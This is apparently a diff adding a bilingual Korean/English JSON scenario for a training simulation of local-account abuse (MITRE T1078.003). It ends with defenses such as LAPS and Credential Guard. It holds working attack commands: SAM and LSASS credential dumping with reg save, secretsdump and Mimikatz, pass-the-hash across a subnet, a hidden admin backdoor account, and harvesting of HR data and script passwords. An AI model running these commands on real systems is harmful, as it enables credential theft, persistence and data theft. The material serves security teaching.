@@ -1,0 +1,155 @@
+{
+  "id": "T1078.003",
+  "title": "로컬 계정 악용 시뮬레이션",
+  "titleEn": "Local Accounts Exploitation Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "🔍 SAM 덤프", "labelEn": "🔍 SAM Dump", "steps": [0] },
+    { "label": "🔑 Pass-the-Hash", "labelEn": "🔑 Pass-the-Hash", "steps": [1] },
+    { "label": "🎯 백도어 계정", "labelEn": "🎯 Backdoor Account", "steps": [2] },
+    { "label": "🛡️ 횡적 이동", "labelEn": "🛡️ Lateral Movement", "steps": [3] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Initial Access)", "x": 50, "y": 80 },
+    { "id": "workstation1", "label": "Workstation-01\n(Compromised)", "x": 200, "y": 30 },
+    { "id": "workstation2", "label": "Workstation-02\n(Same Password)", "x": 200, "y": 130 },
+    { "id": "fileserver", "label": "File Server\n(HR Data)", "x": 350, "y": 80 },
+    { "id": "dc", "label": "Domain\nController", "x": 500, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "workstation1", "minStep": 0 },
+    { "from": "workstation1", "to": "workstation2", "minStep": 1 },
+    { "from": "workstation2", "to": "fileserver", "minStep": 3 },
+    { "from": "fileserver", "to": "dc", "minStep": 3 }
+  ],
+  "desktopIcons": [
+    { "name": "Mimikatz", "icon": "🔑" },
+    { "name": "PsExec", "icon": "💻" },
+    { "name": "SAM Dump", "icon": "📂" },
+    { "name": "Net User", "icon": "👤" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "# SAM/SYSTEM 레지스트리 하이브 덤프\nreg save HKLM\\SAM C:\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM\n\n# Impacket secretsdump로 해시 추출\nsecretsdump.py -sam SAM -system SYSTEM LOCAL\n\n# Mimikatz로 메모리 내 자격증명 추출\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+      "out": "[SAM 레지스트리 덤프]\nSAM → C:\\Temp\\SAM (32KB)\nSYSTEM → C:\\Temp\\SYSTEM (12MB)\n\n[secretsdump 결과]\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\njsmith:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\n\n[Mimikatz 결과]\nAuthentication Id : 0 ; 999\nUser Name         : Administrator\nNTLM             : e19ccf75ee54e06b06a5907af13cef42\nSHA1             : a4f49c406510bdcab6824ee7c30fd852e049af35\n\n⚠️ 3개 로컬 계정 NTLM 해시 추출 완료",
+      "def": "[SIEM] Suspicious access to SAM registry hive — credential dumping detected on Workstation-01",
+      "defAction": "Tool: reg.exe + secretsdump + Mimikatz\nTarget: SAM/SYSTEM registry hives\nAccounts: Administrator, Guest, jsmith\nHashes: 3 NTLM hashes extracted\nRisk Level: Critical\nAction: Isolate workstation, enable LSA Protection",
+      "desc": "SAM 레지스트리 하이브를 덤프하고 secretsdump/Mimikatz로 로컬 계정의 NTLM 해시를 추출합니다. Administrator를 포함한 3개 계정의 해시를 획득합니다.",
+      "descEn": "Dump SAM registry hives and extract NTLM hashes using secretsdump and Mimikatz. Obtain hashes for 3 local accounts including Administrator.",
+      "stepTitle": "SAM 해시 덤프 + 자격증명 추출",
+      "stepTitleEn": "SAM Hash Dump + Credential Extraction",
+      "feynman": "금고(SAM)의 설계도(SYSTEM 키)를 먼저 훔치고, 두 개를 합쳐서 금고 안의 모든 열쇠(NTLM 해시)를 복사합니다. 비밀번호 자체는 모르지만 열쇠 복사본으로 문을 열 수 있습니다.",
+      "feynmanEn": "Steal the safe blueprint (SYSTEM key) first, combine with the safe (SAM) to copy all keys (NTLM hashes). Don't know passwords but copied keys can open doors.",
+      "expert": "SAM(Security Account Manager)은 Windows 로컬 계정 정보를 저장하는 레지스트리 하이브입니다. SYSTEM 하이브의 Boot Key(SysKey)로 SAM을 복호화합니다. Mimikatz의 sekurlsa::logonpasswords는 LSASS 프로세스 메모리에서 자격증명을 추출합니다.",
+      "expertEn": "SAM stores Windows local account data. SYSTEM hive Boot Key (SysKey) decrypts SAM. Mimikatz sekurlsa::logonpasswords extracts credentials from LSASS process memory.",
+      "defTooltip": "🔐 SAM 해시 3개 계정 추출!",
+      "defTooltipEn": "🔐 3 account NTLM hashes extracted!",
+      "hackerLog": { "title": "dump.log", "lines": ["[10:00:00] SAM 레지스트리 덤프 시작", "[10:00:05] SYSTEM 하이브 추출", "[10:00:15] secretsdump 해시 추출", "[10:00:30] Mimikatz LSASS 메모리 덤프"] },
+      "terms": [
+        { "term": "SAM", "def": "Security Account Manager, Windows 로컬 계정 해시를 저장하는 레지스트리 하이브" },
+        { "term": "NTLM Hash", "def": "NT LAN Manager 해시, Windows 인증에 사용되는 비밀번호 해시 값" }
+      ]
+    },
+    {
+      "cmd": "# 탈취한 NTLM 해시로 Pass-the-Hash 공격\npth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.1.20 cmd.exe\n\n# Impacket PsExec\npsexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.1.20\n\n# CrackMapExec 대량 PtH\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42",
+      "out": "[Pass-the-Hash 결과]\n\n192.168.1.20 (Workstation-02):\n  PtH → 성공! ⚠️ SYSTEM 권한 획득\n  LAPS 미적용 → 동일 Administrator 해시\n\n[CrackMapExec 스캔]\n192.168.1.10 SMB  Administrator Pwn3d! ⚠️\n192.168.1.20 SMB  Administrator Pwn3d! ⚠️\n192.168.1.30 SMB  Administrator Pwn3d! ⚠️\n192.168.1.40 SMB  Administrator (접근 거부)\n192.168.1.50 SMB  Administrator Pwn3d! ⚠️\n\n결과: 5대 중 4대 동일 로컬 관리자 해시 ⚠️",
+      "def": "[SIEM] Pass-the-Hash detected — same NTLM hash used across 4 workstations, LAPS not deployed",
+      "defAction": "Tool: pth-winexe + psexec.py + CrackMapExec\nHash: e19ccf75...af13cef42\nCompromised: 4/5 workstations (same hash)\nLAPS: Not deployed\nRights: SYSTEM on all compromised\nRisk Level: Critical\nAction: Deploy LAPS immediately, rotate all local admin passwords",
+      "desc": "탈취한 NTLM 해시로 Pass-the-Hash 공격을 실행합니다. LAPS 미적용으로 5대 중 4대 워크스테이션이 동일한 관리자 해시를 사용하여 모두 장악됩니다.",
+      "descEn": "Execute Pass-the-Hash with stolen NTLM hashes. Without LAPS, 4 of 5 workstations share the same admin hash and are all compromised.",
+      "stepTitle": "Pass-the-Hash 횡적 이동",
+      "stepTitleEn": "Pass-the-Hash Lateral Movement",
+      "feynman": "복사한 마스터 열쇠(NTLM 해시)가 아파트 모든 호(워크스테이션)에 맞습니다. LAPS가 없으면 관리인이 모든 문에 같은 자물쇠를 달아두기 때문입니다.",
+      "feynmanEn": "The copied master key (NTLM hash) fits every apartment (workstation). Without LAPS, the manager installed the same lock on every door.",
+      "expert": "Pass-the-Hash는 비밀번호 대신 NTLM 해시로 NTLM 인증을 통과합니다. LAPS(Local Administrator Password Solution)는 GPO를 통해 각 시스템의 로컬 관리자 비밀번호를 고유하게 자동 관리합니다. CrackMapExec의 Pwn3d!는 관리자 권한 획득을 의미합니다.",
+      "expertEn": "Pass-the-Hash bypasses NTLM auth using hash instead of password. LAPS auto-manages unique local admin passwords via GPO. CrackMapExec's Pwn3d! indicates admin rights obtained.",
+      "defTooltip": "🔐 PtH로 4대 워크스테이션 장악!",
+      "defTooltipEn": "🔐 PtH compromised 4 workstations!",
+      "hackerLog": { "title": "pth.log", "lines": ["[10:05:00] PtH 공격 시작", "[10:05:03] WS-02 SYSTEM 획득", "[10:05:10] CrackMapExec 대량 스캔", "[10:05:15] 4대 Pwn3d!"] },
+      "terms": [
+        { "term": "Pass-the-Hash", "def": "NTLM 해시를 사용하여 비밀번호 없이 Windows 인증을 통과하는 공격 기법" },
+        { "term": "LAPS", "def": "Local Administrator Password Solution, 각 시스템 고유 로컬 관리자 비밀번호 자동 관리" }
+      ]
+    },
+    {
+      "cmd": "# 숨겨진 백도어 로컬 계정 생성\nnet user support$ C0mpl3x!P@ss /add\nnet localgroup administrators support$ /add\n\n# 계정 숨기기 (레지스트리)\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v support$ /t REG_DWORD /d 0 /f\n\n# RDP 접근 허용\nnet localgroup \"Remote Desktop Users\" support$ /add",
+      "out": "[백도어 계정 생성]\n명령을 잘 실행했습니다.\n\n사용자 계정 'support$' 생성 완료\n  → Administrators 그룹 추가 ✓\n  → Remote Desktop Users 그룹 추가 ✓\n  → 로그인 화면에서 숨김 ✓\n  → net user 목록에서 숨김 ($접미사) ✓\n\n[현재 로컬 계정 목록 (net user)]\nAdministrator     Guest             jsmith\n\n⚠️ support$ 계정은 목록에 표시되지 않음!\n\n[net user support$ 실행 시에만 확인 가능]\n계정 이름          support$\n계정 활성           예\n로컬 그룹 멤버 자격  *Administrators *Remote Desktop Users",
+      "def": "[SIEM] Event 4720: New user account created (support$) — hidden backdoor account with admin rights",
+      "defAction": "Tool: net user + reg.exe\nAccount: support$ (hidden with $ suffix)\nGroups: Administrators, Remote Desktop Users\nRegistry: Hidden from login screen\nPersistence: Survives reboots\nRisk Level: Critical\nAction: Audit Event 4720, check hidden accounts via registry",
+      "desc": "support$라는 숨겨진 백도어 로컬 계정을 생성하고 관리자 그룹에 추가합니다. $ 접미사와 레지스트리 설정으로 일반 계정 목록에서 숨깁니다.",
+      "descEn": "Create hidden backdoor account 'support$' with admin rights. Hide from account listings using $ suffix and registry settings.",
+      "stepTitle": "백도어 계정 생성 + 은닉",
+      "stepTitleEn": "Backdoor Account Creation + Concealment",
+      "feynman": "아파트에 관리사무소(net user)에 등록하지 않는 비밀 열쇠(support$ 계정)를 만듭니다. 이름 끝에 $를 붙여 입주자 명단에서 안 보이게 하고, 관리자 열쇠로 승격시킵니다.",
+      "feynmanEn": "Create a secret key (support$ account) not listed in the building directory. The $ suffix hides it from resident lists, then upgrade to master key (admin).",
+      "expert": "Windows에서 계정명 끝에 $를 붙이면 'net user' 명령에서 숨겨집니다. SpecialAccounts\\UserList 레지스트리로 로그인 화면에서도 숨길 수 있습니다. Windows Event 4720(계정 생성)과 4732(보안 그룹 멤버 추가)로 탐지합니다.",
+      "expertEn": "Windows hides accounts ending with $ from 'net user'. SpecialAccounts\\UserList registry hides from login screen. Detect via Event 4720 (account created) and 4732 (security group member added).",
+      "defTooltip": "🔐 숨겨진 백도어 계정 생성!",
+      "defTooltipEn": "🔐 Hidden backdoor account created!",
+      "hackerLog": { "title": "backdoor.log", "lines": ["[10:10:00] support$ 계정 생성", "[10:10:05] Administrators 그룹 추가", "[10:10:10] 레지스트리 숨김 설정", "[10:10:15] RDP 접근 허용"] },
+      "terms": [
+        { "term": "$ suffix", "def": "Windows 계정명 끝에 $를 붙여 net user 명령에서 숨기는 은닉 기법" },
+        { "term": "Event 4720", "def": "Windows 보안 이벤트 로그, 새 사용자 계정 생성 시 기록" }
+      ]
+    },
+    {
+      "cmd": "# 백도어 계정으로 파일 서버 접근\nnet use \\\\192.168.1.100\\HR$ /user:support$ C0mpl3x!P@ss\ndir \\\\192.168.1.100\\HR$\n\n# 급여 데이터 수집\ncopy \\\\192.168.1.100\\HR$\\Payroll\\2025_salary.xlsx C:\\Temp\\\n\n# 추가 자격증명 수집\nfindstr /si \"password\" \\\\192.168.1.100\\IT$\\Scripts\\*.ps1",
+      "out": "[파일 서버 접근]\n\\\\192.168.1.100\\HR$ 연결 성공 (support$)\n\n[HR 공유 폴더]\n2025_salary.xlsx      (직원 급여 정보)\nemployees_pii.csv     (개인정보)\nperformance_2025.pdf  (인사평가)\ntermination_list.docx (해고 예정자)\n\n[급여 데이터 복사]\n1 파일이 복사되었습니다. (2.3MB)\n\n[스크립트 비밀번호 검색]\nIT$\\Scripts\\deploy.ps1:  $password = 'Admin@2025!'\nIT$\\Scripts\\backup.ps1:  $cred = 'sa:SQLp@ss123'\nIT$\\Scripts\\monitor.ps1: $apikey = 'sk-proj-abc...'\n\n⚠️ HR 기밀 데이터 + 3개 추가 자격증명 획득",
+      "def": "[SIEM] Suspicious file share access from backdoor account — HR data exfiltration and credential harvesting",
+      "defAction": "Tool: net use + findstr\nTarget: File Server HR$ share\nData: Salary, PII, performance records\nCredentials: 3 additional found in scripts\nExfiltrated: 2.3MB salary data\nRisk Level: Critical\nAction: Revoke share access, audit all hidden accounts, rotate discovered credentials",
+      "desc": "백도어 계정으로 파일 서버의 HR 공유에 접근하여 급여·인사 데이터를 탈취합니다. IT 스크립트에서 하드코딩된 비밀번호 3개를 추가로 발견합니다.",
+      "descEn": "Access file server HR share with backdoor account, exfiltrate salary and personnel data. Discover 3 hardcoded passwords in IT scripts.",
+      "stepTitle": "파일 서버 접근 + 데이터 탈취",
+      "stepTitleEn": "File Server Access + Data Exfiltration",
+      "feynman": "비밀 열쇠(support$)로 인사과(HR 공유)에 들어가 급여 명세서를 복사합니다. IT 부서 서랍에서 다른 시스템 비밀번호가 적힌 메모장도 발견합니다.",
+      "feynmanEn": "Enter HR department with secret key (support$), copy payroll documents. Find password notebooks in IT department drawers with credentials for other systems.",
+      "expert": "Windows 관리 공유(C$, ADMIN$, IPC$)는 관리자에게 원격 접근을 제공합니다. PowerShell 스크립트에 비밀번호를 하드코딩하는 것은 CIS Benchmark에서 금지하는 관행입니다. findstr /si는 대소문자 무시(-i) 하위 디렉토리(-s) 검색입니다.",
+      "expertEn": "Windows admin shares (C$, ADMIN$, IPC$) provide remote admin access. Hardcoding passwords in scripts violates CIS Benchmarks. findstr /si searches subdirectories case-insensitively.",
+      "defTooltip": "🔐 HR 데이터 + 스크립트 비밀번호 탈취!",
+      "defTooltipEn": "🔐 HR data + script passwords stolen!",
+      "hackerLog": { "title": "lateral.log", "lines": ["[10:20:00] 파일 서버 연결", "[10:20:05] HR 공유 접근", "[10:20:15] 급여 데이터 복사", "[10:20:25] 스크립트 비밀번호 수집"] },
+      "terms": [
+        { "term": "Admin Share", "def": "Windows 관리 공유(C$, ADMIN$), 관리자 원격 접근을 위한 숨겨진 네트워크 공유" },
+        { "term": "Credential Harvesting", "def": "스크립트, 파일, 레지스트리 등에서 비밀번호를 수집하는 기법" }
+      ]
+    },
+    {
+      "cmd": "# LAPS 배포\nInstall-WindowsFeature LAPS\nImport-Module AdmPwd.PS\nSet-AdmPwdComputerSelfPermission -OrgUnit \"OU=Workstations,DC=corp,DC=local\"\n\n# Credential Guard 활성화\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" -Name \"EnableVirtualizationBasedSecurity\" -Value 1\n\n# 숨겨진 계정 탐지 스크립트\nGet-WmiObject Win32_UserAccount | Where {$_.Name -like '*$'} | Select Name,SID,Disabled",
+      "out": "[LAPS 배포]\n✅ LAPS GPO 적용: 모든 워크스테이션\n✅ 비밀번호 자동 변경 주기: 30일\n✅ 비밀번호 복잡도: 20자 무작위\n✅ AD에 안전하게 저장\n\n[Credential Guard]\n✅ VBS(가상화 기반 보안) 활성화\n✅ LSASS 격리 보호\n✅ 메모리 내 자격증명 보호\n✅ PtH/PtT 공격 차단\n\n[숨겨진 계정 탐지]\n✅ $ 접미사 계정 스캔: support$ 발견 → 삭제\n✅ Event 4720/4732 실시간 알림 설정\n✅ 로컬 관리자 그룹 감사 자동화\n✅ SAM 접근 시 Event 4661 알림\n\n[종합 방어]\n✅ LSA Protection (RunAsPPL) 활성화\n✅ Restricted Admin Mode\n✅ 로컬 계정 원격 접근 제한 (GPO)\n✅ 분기별 로컬 계정 감사",
+      "def": "[SIEM] Local account defense deployed — LAPS, Credential Guard, hidden account detection, LSA Protection enabled",
+      "defAction": "Tool: LAPS + Credential Guard + GPO + Monitoring\nLAPS: 30-day auto-rotation, 20-char random\nCredential Guard: VBS + LSASS isolation\nDetection: Event 4720/4732/4661 alerts\nHidden Account: support$ found and removed\nLSA Protection: RunAsPPL enabled\nRisk Level: Low (with implementation)\nAction: Maintain quarterly audits",
+      "desc": "LAPS로 각 시스템 고유 비밀번호를 자동 관리하고, Credential Guard로 메모리 내 자격증명을 보호합니다. 숨겨진 계정을 탐지하고 LSA Protection을 활성화합니다.",
+      "descEn": "Deploy LAPS for unique passwords per system, Credential Guard for memory protection. Detect hidden accounts and enable LSA Protection.",
+      "stepTitle": "LAPS + Credential Guard + 숨겨진 계정 탐지",
+      "stepTitleEn": "LAPS + Credential Guard + Hidden Account Detection",
+      "feynman": "4가지 대책: 1) 모든 아파트에 다른 자물쇠를 달고 30일마다 교체(LAPS), 2) 열쇠를 특수 금고에 보관(Credential Guard), 3) 비밀 열쇠를 자동으로 찾아내는 순찰($ 계정 탐지), 4) 금고 설계도를 암호화(LSA Protection).",
+      "feynmanEn": "4 measures: 1) Different locks for each apartment, changed every 30 days (LAPS), 2) Keys in special vault (Credential Guard), 3) Patrol finding secret keys ($ account detection), 4) Encrypted safe blueprints (LSA Protection).",
+      "expert": "LAPS는 GPO를 통해 각 컴퓨터의 로컬 관리자 비밀번호를 고유하게 관리하고 AD에 ms-Mcs-AdmPwd 속성으로 저장합니다. Credential Guard는 VBS(Virtualization-Based Security)로 LSASS를 격리하여 PtH/PtT 공격을 차단합니다. RunAsPPL은 LSASS를 PPL(Protected Process Light)로 보호합니다.",
+      "expertEn": "LAPS manages unique local admin passwords via GPO, stored in AD as ms-Mcs-AdmPwd. Credential Guard isolates LSASS with VBS to block PtH/PtT. RunAsPPL protects LSASS as Protected Process Light.",
+      "defTooltip": "🔐 LAPS + Credential Guard 방어 완성!",
+      "defTooltipEn": "🔐 LAPS + Credential Guard defense complete!",
+      "hackerLog": { "title": "defense.log", "lines": ["[11:00:00] LAPS GPO 배포", "[11:05:00] Credential Guard 활성화", "[11:10:00] support$ 계정 탐지/삭제", "[11:15:00] LSA Protection 활성화"] },
+      "terms": [
+        { "term": "Credential Guard", "def": "가상화 기반 보안(VBS)으로 LSASS를 격리하여 자격증명 탈취를 차단하는 Windows 보안 기능" },
+        { "term": "RunAsPPL", "def": "LSASS를 Protected Process Light로 실행하여 비인가 접근을 차단" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "mimikatz.exe",
+    "pid": 6000,
+    "children": [
+      {
+        "name": "secretsdump.py",
+        "pid": 6100,
+        "children": [
+          { "name": "pth-winexe (PtH)", "pid": 6110, "children": [
+            { "name": "cmd.exe (SYSTEM)", "pid": 6111, "children": [] }
+          ] }
+        ]
+      }
+    ]
+  }
+}
